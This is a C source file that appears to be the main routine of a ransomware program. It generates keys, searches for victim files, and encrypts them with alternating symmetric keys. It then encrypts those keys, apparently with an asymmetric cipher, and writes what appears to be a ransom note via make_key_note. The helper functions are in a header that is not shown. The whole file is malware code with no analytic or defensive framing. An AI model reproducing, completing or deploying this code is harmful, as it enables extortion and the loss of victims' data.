#include "ran.h"
int main()
{
	unsigned char iv_1[16];
	unsigned char iv_2[16];

	unsigned char key_1[32];
	unsigned char key_2[32];
	unsigned char key_3[32];

	gen_key(iv_1, 16);
	gen_key(iv_2, 16);

	gen_key(key_1, 32);
	gen_key(key_2, 32);
	gen_key(key_3, 32);

	char file_names[100][MAX_PATH];
	int file_count = 0;
	int file_size[100];

	file_search(file_names, &file_count);

	for (int i = 0; i < file_count; i++) {
		file_size[i] = get_file_size(file_names, i);
	}
	
	int enc_size[100];
	unsigned char iv[16];
	for (int i = 0; i < file_count; i++) {
		memcpy(iv, iv_1, 16);
		if ((i + 1) % 2 == 1)
			file_enc(file_names[i], i + 1, key_1, iv);
		else
			file_enc(file_names[i], i + 1, key_2, iv);
		enc_size[i] = get_enc_size(file_names[i], i+1);
	}

	unsigned char key_1_enc[512];
	unsigned char key_2_enc[512];

	r_enc(key_1, key_1_enc);
	r_enc(key_2, key_2_enc);

	for (int i = 0; i < file_count; i++) {
		memcpy(iv, iv_1, 16);
		make_encfile(file_names[i], i + 1, key_1_enc, key_2_enc, iv, file_size[i], enc_size[i]);
	}

	make_key_note(key_3, iv_2);

	return 0;
}